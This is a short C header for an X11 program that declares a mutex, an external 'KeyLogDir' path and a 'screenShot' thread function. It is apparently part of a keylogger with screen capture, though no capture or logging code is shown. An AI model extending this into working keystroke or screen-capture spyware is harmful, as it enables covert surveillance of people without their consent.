#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <pthread.h>
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <string.h>

// Ensure KeyLogDir isn’t changed while the screenshot thread reads it.
extern pthread_mutex_t dirLock;
extern char *KeyLogDir;

void* screenShot(void *arg);